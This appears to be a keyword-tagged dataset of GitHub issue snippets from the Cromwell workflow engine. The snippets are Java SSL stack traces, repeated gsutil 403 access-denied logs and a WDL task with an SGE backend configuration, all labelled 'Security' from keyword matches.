sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1870); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1815); 	at sun.security.ssl.AppOutputStream.write(AppOutputStream.java:128); 	at java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:82); 	at java.io.BufferedOutputStream.flush(BufferedOutputStream.java:140); 	at java.io.PrintStream.flush(PrintStream.java:338); 	at java.io.FilterOutputStream.flush(FilterOutputStream.java:140); 	at com.google.api.client.http.AbstractInputStreamContent.writeTo(AbstractInputStreamContent.java:73); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:79); 	... 26 more; Caused by: java.net.SocketException: Broken pipe; 	at java.net.SocketOutputStream.socketWrite0(Native Method); 	at java.ne,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:5421,secur,security,5421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['secur'],['security']
Security,".java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7807,secur,security,7807,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,.lang.Thread.State: RUNNABLE; at sun.nio.ch.FileDispatcherImpl.read0(Native Method); at sun.nio.ch.FileDispatcherImpl.read(FileDispatcherImpl.java:46); at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:223); at sun.nio.ch.IOUtil.read(IOUtil.java:197); at sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:159); - locked <0x00000006c54b2e78> (a java.lang.Object); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); - locked <0x00000006c54b2ec8> (a sun.nio.ch.ChannelInputStream); at org.apache.commons.codec.digest.DigestUtils.updateDigest(DigestUtils.java:798); at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.util.TryWithResource$$anonfun$tryWithResource$1.apply(TryWithResource.scala:16); at scala.util.Try$.apply(Try.scala:192); at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:47); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at cromwell.bac,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1597:1348,Hash,HashFileStrategy,1348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1597,2,"['Hash', 'hash']","['HashFileStrategy', 'hash']"
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3512,access,access,3512,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4766,access,access,4766,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6020,access,access,6020,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7274,access,access,7274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8528,access,access,8528,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9782,access,access,9782,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11036,access,access,11036,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12290,access,access,12290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13544,access,access,13544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,.netty.handler.ssl.SslHandler$SslTasksRunner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcna,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:6865,secur,security,6865,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['secur'],['security']
Security,".py) \; ${write_tsv(fastqs)} \; --adapters ${write_tsv(adapters)} \; ${if paired_end then ""--paired-end"" else """"} \; ${if select_first([auto_detect_adapter,false]) then ""--auto-detect-adapter"" else """"} \; ${""--min-trim-len "" + select_first([min_trim_len,5])} \; ${""--err-rate "" + select_first([err_rate,'0.1'])} \; ${""--nth "" + select_first([cpu,2])}; }; output {; # WDL glob() globs in an alphabetical order; # so R1 and R2 can be switched, which results in an; # unexpected behavior of a workflow; # so we prepend merge_fastqs_'end'_ (R1 or R2); # to the basename of original filename; # this prefix will be later stripped in bowtie2 task; Array[File] trimmed_merged_fastqs = glob(""merge_fastqs_R?_*.fastq.gz""); }; runtime {; cpu : select_first([cpu,2]); memory : ""${select_first([mem_mb,'12000'])} MB""; time : select_first([time_hr,24]); disks : select_first([disks,""local-disk 100 HDD""]); }; }; ```. My backend.conf :; ```; include required(classpath(""application"")). backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10000; runtime-attributes= """"""; Int? cpu=1; Int? memory=4; String? disks; String? time; String? preemptible; """"""; submit = """"""; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe smp ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${out} \; -e ${err} \; ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". filesystems {; local {; localization: [; ""soft-link"",""copy"",""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"",""copy"",""hard-link""]; hashing-strategy: ""file""; }; }; }; }; }; }; }; engine{; filesystems{; local{; localization: [; ""soft-link"",""copy"",""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"",""copy"",""hard-link""]; hashing-strategy: ""file""; }; }; }; }; ```. I wonder if there is something wrong with my config files or if Cromwell's localization is at fault.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3876:4739,hash,hashing-strategy,4739,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3876,2,['hash'],['hashing-strategy']
